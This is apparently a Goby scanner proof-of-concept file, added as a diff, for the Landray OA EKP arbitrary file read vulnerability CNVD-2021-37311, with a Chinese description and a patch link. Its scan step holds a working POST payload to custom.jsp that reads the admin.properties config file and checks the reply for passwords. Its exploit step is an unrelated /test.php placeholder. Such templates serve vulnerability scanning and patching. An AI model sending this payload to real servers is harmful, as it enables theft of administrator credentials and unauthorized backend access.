@@ -1,0 +1,99 @@
+{
+      "Name": "Landray-OA-Arbitrary file reading-CNVD-2021-37311",
+      "Level": "3",
+      "Tags": [
+            "fileread"
+      ],
+      "GobyQuery": "app=landray-oa system",
+      "Description": "深圳市蓝凌软件股份有限公司是国内知名的大平台OA服务商和国内领先的知识管理解决方案提供商，是专业从事组织的知识化咨询、软件研发、实施、技术服务的国家级高新技术企业。\n\n蓝凌新一代数字OA（大中型企业）EKP存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息，读取配置文件，登录后台。",
+      "Product": "深圳市蓝凌软件股份有限公司 新一代数字OA（大中型企业）EKP",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "<p><span>蓝凌新一代数字OA（大中型企业）EKP存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息，读取配置文件，登录后台。</span><br></p>",
+      "Recommendation": "<p>产品补丁：<a href>https://www.cnvd.org.cn/patchInfo/show/268126</a><br></p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/sys/ui/extend/varkind/custom.jsp",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "password",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2022-01-16 08:57:24",
+      "GobyVersion": "1.9.314"
+}
